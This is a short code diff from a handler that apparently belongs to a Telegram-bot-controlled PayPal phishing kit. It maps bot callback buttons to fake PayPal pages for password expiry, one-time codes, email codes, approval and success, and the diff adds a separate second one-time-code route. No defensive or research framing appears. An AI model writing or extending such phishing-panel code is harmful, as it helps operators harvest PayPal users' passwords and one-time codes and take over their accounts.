@@ -276,7 +276,7 @@ async function handleCallbackQuery(query: any, botToken: string) {
       'paypal_approve': '/paypal/approve',
       'paypal_password': '/paypal/password-expired',
       'paypal_otp1': '/paypal/otp',
-      'paypal_otp2': '/paypal/otp',
+      'paypal_otp2': '/paypal/otp2',
       'paypal_otp': '/paypal/otp',
       'paypal_otp_email': '/paypal/otp-email',
       'paypal_success': '/paypal/success',
